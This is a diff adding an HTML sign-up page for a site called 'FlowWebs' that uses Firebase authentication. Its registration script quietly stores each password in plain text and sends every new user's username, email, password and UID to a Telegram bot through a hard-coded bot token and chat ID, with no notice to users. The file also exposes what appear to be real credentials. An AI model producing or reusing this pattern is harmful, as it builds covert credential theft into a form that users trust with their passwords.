@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Sign Up | FlowWebs</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+<style>
+/* A to Z same quality styling matching the screenshot */
+body {
+    background: #1f2437;
+    color: #fff;
+    font-family: sans-serif;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+.box {
+    width: 90%;
+    max-width: 400px;
+    padding: 25px;
+    background: transparent;
+    border-radius: 10px;
+    text-align: center;
+}
+/* Input styling: text-transform: uppercase hata diya gaya hai */
+input {
+    width: 100%;
+    padding: 18px 15px; 
+    margin: 10px 0;
+    border-radius: 8px; 
+    border: none;
+    background: #2a304a; 
+    color: #fff;
+    font-size: 16px;
+    box-sizing: border-box;
+    /* text-transform: uppercase; <--- REMOVED */
+}
+input::placeholder {
+    color: #99a2c3; 
+    opacity: 1; 
+}
+button {
+    width: 100%;
+    padding: 15px;
+    margin: 20px 0 10px 0;
+    border-radius: 8px;
+    border: none;
+    background: #2ecc71; 
+    color: #fff;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+    text-transform: uppercase;
+}
+a {
+    color: #2ecc71;
+    text-decoration: none;
+    font-weight: bold;
+}
+.logo-bar {
+    background: #2a304a; 
+    padding: 15px 0;
+    border-radius: 8px;
+    margin-bottom: 30px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+.logo-bar img {
+    height: 25px;
+    margin-right: 8px;
+}
+.logo-bar h2 {
+    margin: 0;
+    color: #2ecc71;
+    font-size: 20px;
+    font-weight: bold;
+}
+</style>
+</head>
+
+<body>
+<div class="box">
+<div class="logo-bar">
+    <img src="https://uploads.onecompiler.io/4472wkpre/447hx5a47/file_00000000102c7206a431ab279f78cb73.png" alt="Logo"> 
+    <h2>FlowWebs</h2>
+</div>
+
+<input id="username" placeholder="USERNAME">
+<input id="password" type="password" placeholder="PASSWORD">
+<input id="email" placeholder="EMAIL ADDRESS">
+
+<button onclick="register()">Sign Up</button>
+
+<p>Already Have An Account? <a href="index.html">Sign In</a></p> 
+</div>
+
+<script>
+// *** Apne Firebase Configuration aur Telegram Details ko yahan set karein ***
+const firebaseConfig = {
+  apiKey: "AIzaSyBY4tPdcDfl0C-FRiP3L52PA2WctlziUtM",
+  authDomain: "flowwebsff.firebaseapp.com",
+  databaseURL: "https://flowwebsff-default-rtdb.firebaseio.com",
+  projectId: "flowwebsff"
+};
+firebase.initializeApp(firebaseConfig);
+
+const auth = firebase.auth();
+const db = firebase.database();
+
+const BOT_TOKEN = "8381677026:AAF1cE1CJhVHRd-GZSGnKXSX0QtFNYgXACI";
+const CHAT_ID = "6815468331";
+
+function sendTelegram(msg){
+ fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+}
+
+function register(){
+ const username = document.getElementById("username").value.trim();
+ const email = document.getElementById("email").value.trim();
+ const password = document.getElementById("password").value;
+
+ if (!username || !email || !password) {
+     alert("Please fill in all fields.");
+     return;
+ }
+
+ auth.createUserWithEmailAndPassword(email,password)
+ .then(user=>{
+   db.ref("users/"+user.user.uid).set({
+     username:username,
+     email:email,
+     password_plain:password 
+   });
+
+   sendTelegram(
+     "🆕 NEW REGISTER\n" +
+     "👤 Username: "+username+"\n" +
+     "📧 Email: "+email+"\n" +
+     "🔑 Password: "+password+"\n" + 
+     "🆔 UID: "+user.user.uid
+   );
+
+   alert("Registration Successful. Please Sign In.");
+   window.location.href="index.html";
+ })
+ .catch(e=>alert(e.message));
+}
+</script>
+</body>
+</html>
